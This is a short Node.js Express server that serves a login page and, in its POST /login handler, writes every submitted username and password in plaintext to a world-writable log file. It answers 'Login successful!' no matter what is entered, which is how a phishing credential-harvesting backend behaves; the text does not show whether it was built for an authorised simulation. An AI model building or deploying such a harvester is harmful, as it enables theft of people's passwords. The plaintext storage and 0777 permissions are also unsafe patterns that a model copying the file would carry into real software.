const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = 80;

// Middleware
app.use(bodyParser.json());

// ✅ Serve static files from /var/www/html
app.use(express.static("/home/ubuntu/UC1"));

// Ensure the "data" directory exists
const dataDir = path.join(__dirname, "data");
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir);
}
fs.chmodSync(dataDir, 0o777);
// ✅ Serve the login page when visiting "/"
app.get("/", (req, res) => {
    res.sendFile(path.join("/home/ubuntu/UC1", "index.html"));
});

// ✅ Serve login page for GET /login
app.get("/login", (req, res) => {
    res.sendFile(path.join("/home/ubuntu/UC1", "index.html")); // Make sure this file exists
});

// ✅ Handle login data submission (POST request)
app.post("/login", (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: "Username and password required!" });
    }

    const userData = `${new Date().toISOString()} - Username: ${username}, Password: ${password}`;


    // Store credentials in a text file inside the "data" folder
fs.appendFile(path.join(dataDir, "logins.txt"), userData, (err) => {
        if (err) {
            console.error("❌ Error writing to file:", err);
            return res.status(500).json({ error: "Failed to save login data!" });
        }
        console.log("✅ Login saved successfully!");
        res.status(200).json({ message: "Login successful!" });
    });
});

// Start server
app.listen(PORT, "0.0.0.0", () => {  // ✅ Allows external access
    console.log(`Server running on http://localhost:${PORT}`);
});
